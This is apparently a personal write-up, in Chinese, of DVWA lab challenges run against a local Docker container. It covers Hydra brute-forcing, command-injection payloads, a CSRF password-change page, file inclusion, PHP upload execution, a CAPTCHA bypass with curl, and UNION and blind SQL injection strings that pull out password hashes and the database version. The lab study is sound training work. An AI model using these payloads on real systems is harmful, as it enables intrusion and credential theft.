# DVWA writeup

Created time: January 28, 2022 4:30 PM

Last Edited: February 7, 2022 9:28 PM

Property: January 28, 2022 4:30 PM

Tags: Sec


---

# DVWA 環境

```markdown
docker run -d -p 8086:80 vulnerables/web-dvwa
```

# :: Security: Low

基本上可以比較沒負擔的體驗弱點造成的傷害結果和認知到不安全的實作方式，如果要有挑戰可以打 medium，若要參考比較安全的實作方式可以看 impossible 的難度

# 1. Brute Force

### Objective: Your goal is to get the administrator’s password by brute forcing. Bonus points for getting the other four user passwords!

看題目基本上就是要你來硬的 XD

第一個想到的工具是 Hydra or Medusa

## 觀察及測試

先隨便填寫送出，觀察 Network 後發現不是走 POST

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled.png)

仔細一看表單沒有指定 aciton 的目標，是透過在 URL 的參數來登入

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%201.png)

觀察 URL parameters

```bash
http://localhost:8086/vulnerabilities/brute/?username=admin&password=123&Login=Login#
```

先記下錯誤訊息，這個在 hydra 中用得到

```markdown
Username and/or password incorrect.
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%202.png)

## 使用 Hydra 測試密碼

### password lists

借用別人的 password list

SecLists/10-million-password-list-top-100.txt at master · danielmiessler/SecLists
[https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt)

### snippets

gnebbia/hydra_notes: Some notes about Hydra for bruteforcing
[https://github.com/gnebbia/hydra_notes](https://github.com/gnebbia/hydra_notes)

### Target URL

```
[http://localhost:8086/vulnerabilities/brute/?username=qwe&password=123&Login=Login#](http://localhost:8086/vulnerabilities/brute/?username=qwe&password=123&Login=Login#)
```

### Hydra snippets

```bash
hydra -V -l <user> -P <password file> -s <port> -f <host> <module> "/vulnerabilities/brute/?:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect."
```

### module: http-form-get

### 可以用 hydra -U http-get-form 閱讀一下 module 用法

```c
hydra -U http-get-form
```

### http-form-get module syntax

```c
Syntax: <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
```

### path

```
/vulnerabilities/brute/?
```

### GET/POST 變數用 `^` 包住

```c
:username=^USER^&password=^PASS^&Login=Login
```

### error message

```c
:F=Username and/or password incorrect.
```

### brute force

帳號就先用 admin 試試看

```bash
hydra -V -l admin -P 10-million-password-list-top-10000.txt -s 8086 -f localhost http-form-get "/vulnerabilities/brute/?:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect."
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%203.png)

### ✨Done✨

```c
帳號: admin
密碼: password
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%204.png)

### 心得

Hydra options 不太友善 (雖然有 GUI 版本)，有機會想試試 Medusa 或 Burp

Using Burp to Brute Force a Login Page - PortSwigger
[https://portswigger.net/support/using-burp-to-brute-force-a-login-page](https://portswigger.net/support/using-burp-to-brute-force-a-login-page)

### memo

```bash
hydra -l admin -P password.lst -s 80 192.168.1.1 http-get /
```

hydra 的 options 似乎有改變，要留意版本和文件

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%205.png)

使用 http-form-get module 的話，要用 -s 指定 port, -f 指定 host

```bash
:H=Cookie: PHPSESSID=rjevaetqb3dqbj1ph3nmjchel2; security=low
```

---

# 2. Command Injection

### Objective: Remotely, find out the user of the web service on the OS, as well as the machine's hostname via RCE.

security:low 的等級靠運氣猜猜可以中

### 失敗範例

```c
1.1.1.1 && ls
```

```c
1.1.1.1&&ls
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%206.png)

### 成功範例

```c
1.1.1.1;ls
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%207.png)

### 直接跳過 ping

```c
1.1.;ls
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%208.png)

```c
;pwd
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%209.png)

### ✨Done✨

```sql
;ps aux | grep httpd
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2010.png)

web service user is `www-data`

```sql
;hostname
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2011.png)

---

# 3. Cross Site Request Forgery (CSRF)

### Objective: Your task is to make the current user change their own password, without them knowing about their actions, using a CSRF attack.

參考連結裡面有介紹 GET POSt PUT 等不同場景的攻擊方式

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2012.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2013.png)

因為難度是 low，所以這邊練習的重點是引誘別人上鉤，讓目標點擊惡意連結，連結是有讓你更新密碼的 url，所以要模擬一個釣魚的場景，可以做一個有惡意連結頁面或email

### 成立條件至少有兩個:

1. 攻擊對象已經登入服務，在不需要重新驗證的情況下，從其他網域或地方也能存取服務
2. 服務本身有透過連結觸發某些能被你利用功能 (e.g 改密碼, 轉帳)

這就是惡意連結，直接在瀏覽器新開分頁貼上執行，會更改密碼

```bash
GET http://localhost:8086/vulnerabilities/csrf/?password_new=1111&password_conf=1111&Change=Change
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2014.png)

如果是在沒登入過的狀態，就會跳轉到登入頁面

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2015.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2016.png)

## GET

### by <img /> tag

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>csrf by GET</title>
</head>
<body>
set password to: 1111
  <img src="http://localhost:8086/vulnerabilities/csrf/?password_new=1111&password_conf=1111&Change=Change">
</ body>
</html>
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2017.png)

test ok

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2018.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2019.png)

### 心得

現實中可能不容易碰到直接用 GET 跳轉的方式，也要留意不要讓連結執行的過程被呈現出來 XD

因此其他比較低調的方式就值得多實驗看看了

## memo

### 試著用 curl 模擬 CSRF 的過程

如果是直接用 cURL 的方式送出 GET 會沒有效果，密碼沒有被更新，看來無法直接偷渡 browser 的 cookie 給 curl XD

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2020.png)

```bash
curl -L "http://localhost:8086/vulnerabilities/csrf/?password_new=111&password_conf=111&Change=Change# -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: zh-TW,zh;q=0.8,en;q=0.5,en-US;q=0.3' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://localhost:8086/vulnerabilities/csrf/' -H 'Cookie: PHPSESSID=f5ndqiqvp4u92i4thpurq2o1k7; security=low' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1"
```

### create and use cookie

How to use curl with Django, csrf tokens and POST requests - Stack Overflow
[https://stackoverflow.com/questions/10628275/how-to-use-curl-with-django-csrf-tokens-and-post-requests](https://stackoverflow.com/questions/10628275/how-to-use-curl-with-django-csrf-tokens-and-post-requests)

```bash
curl -v -c cookies.txt -b cookies.txt host.com/registrations/register/
curl -v -c cookies.txt -b cookies.txt -d "email=user@site.com&a=1&csrfmiddlewaretoken=<token from cookies.txt>" host.com/registrations/register/
```

觀察後確認每一次夠過 curl 取的 PHPSESSID 都不同 (沒指定 cookie 的情況下)

```bash
curl -v "http://localhost:8086"
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2021.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2022.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2023.png)

create and use the specific cookie

```bash
curl -v "http://localhost:8086" -c cookies.txt -b cookies.txt
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2024.png)

### 模擬登入取得 cookie

### 處理 user_token

登入頁面有 user_token，必須帶入 request 才能登入

```bash
curl -L http://localhost:8086
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2025.png)

```bash
curl -v -L -c cookies.txt -b cookies.txt -X POST "http://localhost:8086/login.php" --data-raw 'username=admin&password=123&Login=Login&user_token=bc27fbf9cc617adb1c1b3f44f9fd1b62'
```

登入成功

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2026.png)

接下來就可以利用取得的 cookie 來模擬更改密碼的行為，將密碼改成 111

```bash
curl -v -c cookies.txt -b cookies.txt "http://localhost:8086/vulnerabilities/csrf/?password_new=111&password_conf=111&Change=Change#"
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2027.png)

測試 ok

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2028.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2029.png)

---

# 4. File Inclusion

### Objective: Read all five famous quotes from '[../hackable/flags/fi.php](http://localhost:8086/hackable/flags/fi.php)' using only the file inclusion.

如果網站有讀取檔案相關的功能，你又能夠利用這個特性來操控被讀取的檔案的話，就有機會發現這類檔案讀取相關的弱點，嚴重的情況可能造成 RCE

## 觀察

從 URL 可以很直覺的發現有地方可以 try

```bash
http://localhost:8086/vulnerabilities/fi/?page=file1.php
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2030.png)

## 測試 URL parameters

看到連續的數字就會很自然的想加上去

```bash
http://localhost:8086/vulnerabilities/fi/?page=file4.php
```

發現了一個隱藏檔案 File 4

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2031.png)

接下來不知道要幹嘛，只好看一下提示

### 查看提示中的連結

我們讀取 `../hackable/flags/fi.php` 中的內容

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2032.png)

```html
../hackable/flags/fi.php'
```

可以看出這個檔案的位置在:

```html
http://localhost:8086/hackable/flags/fi.php
```

可以點進去到處看看

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2033.png)

直接點 fi.php，它叫我們用 file include 的方式執行它

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2034.png)

上層也有其他檔案

```html
http://localhost:8086/hackable/flags/
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2035.png)

回到題目，如果從 [`http://localhost:8086/vulnerabilities/fi/`](http://localhost:8086/vulnerabilities/fi/) 要 include 該檔案的話，那就要往前推兩層，也就是 `../../hackable/flags/fi.php`

```html
localhost:8086/vulnerabilities/fi/?page=../../hackable/flags/fi.php
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2036.png)

頁面只出現 3 個答案，有 2 個被隱藏起來了

```html
1.) Bond. James Bond 2.) My name is Sherlock Holmes. It is my business to know what other people don't know.

--LINE HIDDEN ;)--

4.) The pool on the roof must have a leak.
```

不知道它們藏在哪，只好看一下 source，第 5 個就藏在裡面

```html
5.) The world isn't run by weapons anymore, or energy, or money. It's run by little ones and zeroes, little bits of data. It's all just electrons.
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2037.png)

QQ 還有一個 --LINE HIDDEN ;)— 不知道藏在哪，仔細檢查或搜尋好幾次都沒發現

### 試著從其他地方存取檔案

走投無路之下只好從 command injection 偷看資料夾內容

```html
;ls /var/www/html/vulnerabilities/fi
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2038.png)

不過我要觀察的是 `fi.php` ，因為秘密就藏在裡面

```html
;cat /var/www/html/hackable/flags/fi.php
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2039.png)

```html
1.) Bond. James Bond

\n";

$line3 = "3.) Romeo, Romeo! Wherefore art thou Romeo?";
$line3 = "--LINE HIDDEN ;)--";
echo $line3 . "\n\n

\n";

$line4 = "NC4pI" . "FRoZSBwb29s" . "IG9uIH" . "RoZSByb29mIG1" . "1c3QgaGF" . "2ZSBh" . "IGxlY" . "Wsu";
echo base64_decode( $line4 );

?>
```

可以得到第 3 個答案

```html
"3.) Romeo, Romeo! Wherefore art thou Romeo?";
```

第4個答案之前已經找到了，從這邊用 base64 decode $line4 也可以得到相同的結果

```html
NC4pIFRoZSBwb29sIG9uIHRoZSByb29mIG11c3QgaGF2ZSBhIGxlYWsu
4.) The pool on the roof must have a leak.
```

### ✨Done✨

```html
1.) Bond. James Bond

2.) My name is Sherlock Holmes. It is my business to know what other people don't know.

3.) Romeo, Romeo! Wherefore art thou Romeo?

4.) The pool on the roof must have a leak.

5.) The world isn't run by weapons anymore, or energy, or money. It's run by little ones and zeroes, little bits of data. It's all just electrons.
```

## memo

### 測試載入遠端檔案

### 準備一個要被遠端載入的檔案

```bash
echo '<? echo "yo" ?>' > yo.php
```

用 http-server 在 Host machine 建立測試用的 server，這是要給 DVWA container 戳的

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2040.png)

```markdown
http://localhost:8086/vulnerabilities/fi/?page=http://192.168.0.196:8080/yo.php
```

or

```markdown
http://localhost:8086/vulnerabilities/fi/?page=http://host.docker.internal:8080/yo.php
```

可以看到左上角顯示了 yo，代表有成功執行檔案

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2041.png)

# 5. File Upload

### Objective: Execute any PHP function of your choosing on the target system (such as [phpinfo()](https://secure.php.net/manual/en/function.phpinfo.php) or [system()](https://secure.php.net/manual/en/function.system.php)) thanks to this file upload vulnerability.

基本上如果可以上傳並執行任意檔案，就可以做很多事

OWASP 的文件整理得蠻詳細的，有提到上傳檔案也有不同的延伸應用和變化，例如壓縮後上傳以避免掃描或者塞爆硬碟空間之類的作法 XD

## 觀察

### 可以先測試檔案的型態, 大小, 格式 等限制

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2042.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2043.png)

### 留意上傳檔案的位置，因為這代表我們有機會執行這個路徑上的檔案

試著上傳惡意檔案

這是目前頁面的路徑，可以看到檔案上傳的位置是在上上層

```markdown
http://localhost:8086/vulnerabilities/upload/
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2044.png)

```markdown
http://localhost:8086/hackable/uploads/yo.php
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2045.png)

### ✨Done✨

將檔案內容換成 `phpinfo()`

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2046.png)

## memo

### 可以跟 Command injection 混搭測試，執行上傳的惡意檔案

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2047.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2048.png)

```markdown
;php /var/www/html/hackable/uploads/yo.php
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2049.png)

---

# 6. Insecure CAPTCHA

### Objective: Your aim, change the current user's password in an automated manner because of the poor CAPTCHA system.

根據參考資料， CAPTCHA 應該被視為用來 limit request rate

### 觀察

不勾選驗證會無法通關

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2050.png)

看起來目前這個頁面和 CAPTCHA 的整合應該就只有靠前端

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2051.png)

### 試著 bypass 驗證

第一個念頭是關閉 javascript 再送出表單 XD

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2052.png)

依然無法 QQ，還是會有紅字

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2053.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2054.png)

好吧 看起來並不單純

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2055.png)

### 跳過驗證，直接送 POST

再觀察看看表單送出的內容，有個 `step` key (要記得保持 javascript 關閉的狀態，才能觀察到 POST request，方便接下來修改 request)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2056.png)

一樣用老招  XD

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2057.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2058.png)

失敗 QQ

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2059.png)

試著將 step 改成 2 ，然後填入新密碼再送出

```
step=2&password_new=222&password_conf=222&Change=Change
```

```bash
curl 'http://dvwa.localtest:8086/vulnerabilities/captcha/#' -X POST -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: zh-TW,zh;q=0.8,en;q=0.5,en-US;q=0.3' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://dvwa.localtest:8086/vulnerabilities/captcha/' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://dvwa.localtest:8086' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=ov64qqshkod7693old2kdk59e3; security=low' -H 'Upgrade-Insecure-Requests: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw 'step=2&password_new=222&password_conf=222&Change=Change'
```

重登

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2060.png)

### ✨Done✨

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2061.png)

## 心得

### 1. 先關閉 javascript

### 2. 再直接送出 POST (不透過表單)

---

# 7. SQL Injection

### 觀察

先隨便 try try 

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2062.png)

可以發現 URL query string 有可以下手的地方

```bash
http://dvwa.localtest:8086/vulnerabilities/sqli/?id=1&Submit=Submit#
```

### 測試及觀察錯誤訊息

id 第一個數字後面不管接什麼都可以 pass，可能代表 SQL 已經被結尾?

```bash
1zxw1--;
```

```bash
http://dvwa.localtest:8086/vulnerabilities/sqli/?id=1zxw1--;&Submit=Submit#
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2063.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2064.png)

```bash
03
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2065.png)

```bash
0003
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2066.png)

代表它可能對 `GET[’id’]` 做了一些簡單的轉換處理 ?

試著加上 single quotes，看看會有什麼反應

```bash
'1'
```

```bash
http://dvwa.localtest:8086/vulnerabilities/sqli/?id=%271%27&Submit=Submit#
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2067.png)

```bash
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1''' at line 1
```

從這邊可以觀察出 SQL 會自動幫我們補上哪些 single quote，為了更方便觀察，使用其他符號看看

```bash
'1@
```

```bash
http://dvwa.localtest:8086/vulnerabilities/sqli/?id=%271@&Submit=Submit#
```

```bash
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1@'' at line 1
```

可以看出 `@` 的位置，代表 id=1 的後面會被補上兩個 `'` 

我們可以在 '1@' 後面的位置繼續補上 OR ‘1’=’1，讓它行成 ‘1’ = ‘1’

```bash
3' OR '1'='1
```

```bash
http://dvwa.localtest:8086/vulnerabilities/sqli/?id=3%27%20OR%20%271%27=%271&Submit=Submit#
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2068.png)

```bash
2' OR 1='1
```

```bash
http://dvwa.localtest:8086/vulnerabilities/sqli/?id=2%27%20OR%20%271%27=%271&Submit=Submit#
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2069.png)

意味著 SQL 會在前後補上 single quote，因此在第一個 id 後面補上 `'` ，這樣就可以接著第二組的 OR，第 2 組的條件結尾故意不加上 `'` ，這樣就形成合法的 query 了

```bash
2' OR 1='1 union select * from users;
```

## 取得密碼

### 測試 column names

```bash
2' OR user_id='1
```

```bash
# X
1' AND sur_name='admin 
```

```bash
# first_name column ok
1' AND first_name='admin 
```

```bash
# last_name column ok
1' AND last_name='admin
```

```bash
# password column ok
1' AND password<>'0
```

### 測試 table name

```bash
2' UNION SELECT user_id,user_id FROM user WHERE user_id='1
```

```bash
Table 'dvwa.user' doesn't exist
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2070.png)

### show more about tables by query information_schema

```sql
SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
```

```sql
0' UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema !='mysql' AND table_schema !='information_schema
```

```bash
# table name is users
2' UNION SELECT user_id,user_id FROM users WHERE user_id='1
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2071.png)

```bash
2' UNION SELECT user_id,password FROM users WHERE user_id='1
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2072.png)

### ✨Done✨

```bash
1' UNION SELECT first_name,password FROM users WHERE user_id<>'0
```

```bash
1' UNION SELECT first_name,password FROM users WHERE user_id <>'
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2073.png)

### 心得

隨然 wiki 上有標準答案，盡量試著從黑箱角度去推斷原本的 SQL 可能是怎樣寫的，強化理解

---

# 8. SQL Injection (Blind)

### Objective: Find the version of the SQL database software through a blind SQL attack.

頁面顯示的資訊有限，只能靠回傳的值是 true or false 來推測你的 query 的正確性

```bash
# User ID exists in the database.
0' OR '1'='1
```

```bash
# User ID is MISSING from the database.
0' OR '1'='2
```

`‘1’=’2` 不成立，所以不管前面那段 (`0’ OR` ) 是什麼，你都可以靠後面這段來判斷你的猜測是否正確

```bash
2' OR user_id='1
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2074.png)

```bash
1' UNION SELECT VERSIONS()'
```

參考看看找其他環境的 mariadb 版本長什麼樣子

```bash
select @@version;
```

```bash
select VERSION();
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2075.png)

![參考 google](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2076.png)

參考 google

```bash
0' UNION SELECT first_name,password FROM users WHERE user_id <>'
```

```bash
0' UNION SELECT first_name,password FROM users WHERE user_id <>'
```

```jsx
SELECT SUBSTRING((select @@version), 5, 3) AS ExtractString;
```

```sql
0' UNION SELECT 1,SUBSTRING((select @@version), 1, 20)'
```

這是在非 blind injection 查詢 db version 的結果

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2077.png)

```bash
0' UNION SELECT 1,SUBSTRING((select @@version), 1, 20)'
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2078.png)

從這邊我們大概可以推測接下來需要透過 blind injection 來比對 `10.x.x ...` 這類的版本字串

接下來利用 function `@@version` , `SUBSTRING`搭配 `IF` 語法應該就可以猜測版本了

```sql
@@version
```

```sql
SELECT IF(STRCMP('test','test1'),'no','yes');
```

```sql
SELECT SUBSTRING((select @@version), 1, 5) AS ExtractString;
```

確認 IF 能和 SELECT @@VERSION 正常搭配使用

```sql
SELECT IF ((SELECT @@version) = '10.3.32-MariaDB-1:10.3.32+maria~focal', 'pass', 'failed');
```

```sql
SELECT IF (SUBSTRING((SELECT @@version),1,2) = '10', 'pass', 'failed');
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2079.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2080.png)

加上 `1,IF...`

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2081.png)

用 like % 來測試看看

```sql
SELECT IF (SUBSTRING((SELECT @@version),1,7) like '10.%', 'pass', 'failed');
```

```bash
# response code is 404
0
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2082.png)

```bash
1
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2083.png)

```bash
# response code is 200
0' UNION SELECT first_name,password FROM users WHERE user_id <>'
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2084.png)

如果只回傳一個欄位，會得到 404

```bash
# 404
0' UNION SELECT password FROM users WHERE user_id <>'
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2085.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2086.png)

### 分析

### 1. 如果要使用 UNION，那 UNION 左邊和右邊需要回傳一樣的欄位數量

### 2. 可以不透過 IF 來判斷版本

```sql
SELECT SUBSTRING((SELECT @@version),1,2) = 10 AS 'test';
```

掌握簡單的判斷

```sql
select 1=1 AS 'test';
```

```sql
select 1=2 AS 'test';
```

## 卡關

在這邊卡關了，因為太執著於用 SELECT,IF, UNION 的語法，後來看了一下提示的頁面，發現被遮住的答案提示長度並不常，代表應該有更簡短的寫法，因此改變方向，試著思考更簡短的判斷方式，就是 A AND B 這種形式的語法

接著順便重新梳理一下資訊，從推測程式語法的階段開始推敲:

可以假設原本的 SQL 大概長這樣

```sql
SELECT * FROM users WHERE id=0;
```

用 SQL injection 把它變成 `A OR B` 的形式就可以判斷 true false 了

```sql
SELECT * FROM users WHERE id=0 OR (SELECT SUBSTRING((SELECT @@version),1,2) = '10');
```

所以根據之前的 query 結果，我們只要加上版本判斷

```sql
1' AND (SELECT SUBSTRING((SELECT @@version),1,2) = '10')
```

還有為了滿足 injection 的 single quote `1='1` 在結尾

```sql
1' AND (SELECT SUBSTRING((SELECT @@version),1,2) = '10') AND 1='1
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2087.png)

### 驗證測試

這邊要故意輸入錯誤的版本，確認頁面回傳的結果是否為 false，代表我們使用的 injection 邏輯是正確的

```sql
1' AND (SELECT SUBSTRING((SELECT @@version),1,2) = 'xx10') AND 1='1
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2088.png)

### 開始推測

接下來就是利用 `like` 來慢慢逼近或猜測，或用工具會比較方便

```sql
# 200
1' AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.%') AND 1='1
```

```sql
# 200
1' AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.1%') AND 1='1
```

```sql
# 404
1' AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.12%') AND 1='1
```

```sql
# 200
1' AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.1.%') AND 1='1
```

```sql
# 200
1' AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.1.2%') AND 1='1
```

```sql
# 400
1' AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.1.2.%') AND 1='1
```

```sql
# 400
1' AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.1.2%') AND 1='1
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2089.png)

### ✨Done✨

```sql
# 200
1' AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.1.26%') AND 1='1
```

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2090.png)

![Untitled](DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2091.png)

最後再測試版號是否已經結束

```sql
# 400
1' AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.1.26.%') AND 1='1
```

到目前為止可以看出 DB 的版本是 `10.1.26`

## memo

- SQL 測試的殘渣
    
    ```sql
    0' UNION SELECT 1,IF (SUBSTRING((SELECT @@version),1,7) like '10.%', 'pass', 'failed')'
    ```
    
    ```bash
    0' UNION SELECT IF (SUBSTRING((SELECT @@version),1,2) = '10', 'pass', 'failed') WHERE '1'='1
    ```
    
    ```bash
    # User ID exists in the database.
    0' UNION SELECT 1,IF (SUBSTRING((SELECT @@version),1,7) like '10.%', 'pass', 'failed')'
    ```
    
    ```bash
    0' SELECT 1,IF (SUBSTRING((SELECT @@version),1,2) = '10', TRUE, FALSE)'
    
    ```
    
    ```bash
    2' UNION SELECT user_id,password FROM users WHERE user_id='1
    ```
    
    ```bash
    0' UNION SELECT 1,IF (SUBSTRING((SELECT @@version),1,2) = '10', TRUE, FALSE)
    ```
    
    ```bash
    0' UNION SELECT 1,IF (SUBSTRING((SELECT @@version),1,2) = '10', TRUE, FALSE) AS 2'
    ```
    
    ```bash
    0' UNION SELECT 1 WHERE '1'=1'
    ```
    
    ```bash
    0' UNION SELECT 1, (IF (SUBSTRING((SELECT @@version),1,2) = '10', TRUE, FALSE)) AS '2
    ```
    
    ```bash
    0' UNION SELECT 1, (IF (SUBSTRING((SELECT @@version),1,2) = '10', TRUE, FALSE)) AS '2
    ```
    
    ```bash
    0' UNION SELECT 1, (IF (SUBSTRING((SELECT @@version),1,2) = '10', 'pass', 'failed')) AS '2
    ```
    
    ```bash
